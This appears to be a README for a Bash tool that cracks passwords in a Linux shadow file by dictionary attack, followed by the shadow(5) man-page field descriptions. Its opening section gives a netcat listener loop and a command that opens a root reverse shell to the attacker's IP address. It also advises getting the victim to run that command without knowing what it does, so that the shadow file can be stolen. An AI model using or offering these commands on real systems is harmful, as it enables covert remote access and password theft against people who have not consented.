# Shadow_Dictionary
A quick Bash script that can perform a dictionary attack against a shadow file to find passwords

# How do we get a shadow file?
A simple way could be a basic netcat attack. Though this approach is not likely to work in the real world, and you should only play around with this idea in a network you own or have permission to.
## Attacker
Setting up the attack is as simple as running this command on your machine:
```
while true; do nc -l -p 5000 < netcat_attack.sh >> victims.txt; done
```
## Victim
Here is where this sort of attack becomes impractical in the real world. We need to get your victim to run this command on their machine somehow without them knowing what it does.
```
sudo nc 192.168.2.250 5000 -e /bin/sh
```
Of course, the above IP address should be the IP address for your attacker machine

# What is a shadow file?
## From the man page for shadow
shadow is a file which contains the password information for the system's accounts and optional aging information.
This file must not be readable by regular users if password security is to be maintained.
Each line of this file contains 9 fields, separated by colons (“:”), in the following order:

1. login name
    * It must be a valid account name, which exist on the system.
  
2. encrypted password
    * Refer to crypt(3) for details on how this string is interpreted.
    * If the password field contains some string that is not a valid result of crypt(3), for instance ! or *, the user will not be         able to use a unix password to log in (but the user may log in the system by other means).
    * This field may be empty, in which case no passwords are required to authenticate as the specified login name. However, some applications which read the /etc/shadow file may decide not to permit any access at all if the password field is empty.
    * A password field which starts with an exclamation mark means that the password is locked. The remaining characters on the line represent the password field before the password was locked.

3. date of last password change
    * The date of the last password change, expressed as the number of days since Jan 1, 1970.
    * The value 0 has a special meaning, which is that the user should change her password the next time she will log in the system.
    * An empty field means that password aging features are disabled.

4. minimum password age
    * The minimum password age is the number of days the user will have to wait before she will be allowed to change her password again.
    * An empty field and value 0 mean that there are no minimum password age.

5. maximum password age
    * The maximum password age is the number of days after which the user will have to change her password.
    * After this number of days is elapsed, the password may still be valid. The user should be asked to change her password the next time she will log in.
    * An empty field means that there are no maximum password age, no password warning period, and no password inactivity period (see below).
    * If the maximum password age is lower than the minimum password age, the user cannot change her password.

6. password warning period
    * The number of days before a password is going to expire (see the maximum password age above) during which the user should be warned.
    * An empty field and value 0 mean that there are no password warning period.

7. password inactivity period
    * The number of days after a password has expired (see the maximum password age above) during which the password should still be accepted (and the user should update her password during the next login).
    * After expiration of the password and this expiration period is elapsed, no login is possible using the current user's password. The user should contact her administrator.
    * An empty field means that there are no enforcement of an inactivity period.

8. account expiration date
    * The date of expiration of the account, expressed as the number of days since Jan 1, 1970.
    * Note that an account expiration differs from a password expiration. In case of an account expiration, the user shall not be allowed to login. In case of a password expiration, the user is not allowed to login using her password.
    * An empty field means that the account will never expire.
    * The value 0 should not be used as it is interpreted as either an account with no expiration, or as an expiration on Jan 1, 1970.

9. reserved field
    * This field is reserved for future use.
